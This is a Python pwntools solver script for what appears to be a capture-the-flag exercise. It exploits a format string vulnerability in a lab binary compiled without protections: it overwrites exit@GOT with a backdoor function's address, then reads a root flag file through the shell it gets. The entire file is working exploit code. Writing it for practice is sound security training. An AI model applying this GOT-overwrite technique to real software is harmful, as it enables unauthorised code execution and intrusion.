#!/usr/bin/env python3
# =============================================================================
# BINARY-02 Solver: Format String Overwrite
# Overwrites exit@GOT with the address of secret_backdoor
# =============================================================================

from pwn import *
import sys

# Set binary info
elf = context.binary = ELF('./binary02_fmt', checksec=False)

def solve(local=True):
    # Find addresses
    exit_got = elf.got['exit']
    backdoor = elf.sym['secret_backdoor']
    
    log.info(f"exit@GOT: {hex(exit_got)}")
    log.info(f"secret_backdoor: {hex(backdoor)}")

    # We need to construct a format string payload to overwrite exit_got with backdoor.
    # We pass the payload as argv[1]. Using typical format string vuln:
    # 64-bit format strings using positional args: %n
    # pwntools fmtstr_payload makes this trivial if we know the offset.
    
    # We need to find the offset of our payload on the stack.
    # In 64-bit local args, first 6 are registers (rdi, rsi, rdx, rcx, r8, r9), 
    # then stack. For printf(buffer), buffer is on the stack.
    # Let's assume offset 6 or 8. The robust way is to use FmtStr to find it:
    
    def exec_fmt(payload):
        p = process([elf.path, payload])
        p.recvuntil(b"entry: ")
        resp = p.recvline()
        p.close()
        return resp

    # Find format string offset
    autofmt = FmtStr(exec_fmt, padlen=0)
    offset = autofmt.offset
    log.info(f"Format string offset found at: {offset}")

    # Generate payload to write `backdoor` address into `exit_got`
    payload = fmtstr_payload(offset, {exit_got: backdoor})
    
    log.info(f"Generated Payload ({len(payload)} bytes): {payload}")

    # Exploit
    p = process([elf.path, payload])
    
    # Send a command to the popped shell to grab the flag
    p.sendline(b"cat /root/flag_binary02.txt")
    
    output = p.recvall(timeout=2).decode(errors='ignore')
    
    if "FLAG{" in output:
        flag = output[output.find("FLAG{"):output.find("}", output.find("FLAG{"))+1]
        log.success(f"Vulnerability Exploited Successfully! Flag: {flag}")
    else:
        log.error("Exploitation failed. Check the output:\n" + output)

if __name__ == "__main__":
    # Ensure binary exists locally to extract offsets
    if not os.path.exists("./binary02_fmt"):
        log.error("binary02_fmt not found. Compile it first: gcc -fno-stack-protector -no-pie -o binary02_fmt binary02_fmt.c")
        sys.exit(1)
        
    solve()
